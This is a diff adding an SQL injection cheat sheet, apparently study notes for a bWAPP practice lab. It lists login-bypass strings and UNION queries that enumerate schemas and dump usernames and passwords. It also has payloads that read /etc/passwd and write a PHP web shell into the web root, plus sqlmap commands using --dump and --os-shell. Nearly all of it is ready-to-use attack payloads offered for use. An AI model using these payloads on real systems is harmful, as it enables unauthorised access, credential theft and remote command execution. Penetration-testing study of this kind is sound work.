@@ -1,0 +1,44 @@
+IMPORTANT CHARACTERS: '     "       ]       
+
+AUTHENTICATION BYPASS:
+    admin' or 1=1 --            //with a space after --   
+    <username>' or 1=1 --                 
+    ' or 1=1 #
+    ' or 1=1 /**
+    ' or 1=1 /** /
+    ' or '1'='1';#
+    //all the characters at the end of the string are to signal that everything AFTER that string is a comment (they depends from sql versio ecc) (do not check password if it is a login)
+    <username>' or 1=1 LIMIT 1;--                   //se il codice vuole un unico risultato (altri sql statement ritornano tutta la table di utenti)
+
+OTHERS (SEARCH RESULTS):
+    something' order by 7 --        //error-based
+    something' union all select --  
+    something' union all select 1,2,3,4,5,6,7 --    //setting numbers as columns name these could be showed in the clumn on the web page
+    something' union all select 1,user(),3,4,@@version,6,7 --   //knowing which names are showed i can put there some expression to enumerate the database //2,5 are visulized in the web page
+    something' union all select 1,table_name,3,4,5,6,7 from information_schema.tables -- 
+    something' union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users' -- 
+    something' union all select 1,login,3,4,password,6,7 from users -- 
+    http://10.11.0.22/debug.php?id=1 union all select 1,2,user()                //display user running db   (may vary for other dbms)    
+    http://10.11.0.22/debug.php?id=1 union all select 1,2,table_name from infomation_schema.tables
+    http://10.11.0.22/debug.php?id=1 union all select 1,2,column_name from infomation_schema.columns where table_name='users'
+    http://10.11.0.22/debug.php?id=1 union all select 1,username,password from users         
+    1'-sleep(1) #           //time-based test to see if sql injection is working if there is blind sql injection
+    1'-sleep(1) order by 2 #
+
+AFFECT FILES ON FILE SYSTEM:
+    something' union all select 1,load_file("/etc/passwd"),3,4,5,6,7 --             //READ FILES
+    something' union all select 1,"TEST",3,4,5,6,7 into outfile '/tmp/filename.txt' --      //WRITE FILE (Write TEST into file) 
+    something' union all select 1,"<?php echo shell_exec($_GET['cmd']);?>",3,4,5,6,7 into outfile '/var/www/bWAPP/documents/revshell.php' -- 
+    http://10.11.0.22/debug.php?id=1' union all select 1,"<?php echo shell_exec($_GET['cmd']);?>",3,4,5,6,7 into outfile '/var/www/bWAPP/documents/revshell.php' -- 
+
+TOOLS:
+    sqlmap --cookie="PHPSESSID=uhewuihfwiuhf; security_level=0" --data="title=iron+man&action=search" -u "http://10.10.10.11/sqli.php" --dump       //find info with burp, --dump to print to screen
+    sqlmap --cookie="PHPSESSID=uhewuihfwiuhf; security_level=0" --data="title=iron+man&action=search" -u "http://10.10.10.11/sqli.php" -D bwAPP --os-shell     //-D to tell directory (/var/www/bWAPP), may be given later in interactive prompt and --os-shell to gain a shell
+    sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"
+    sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
+    sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
+    
+
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+
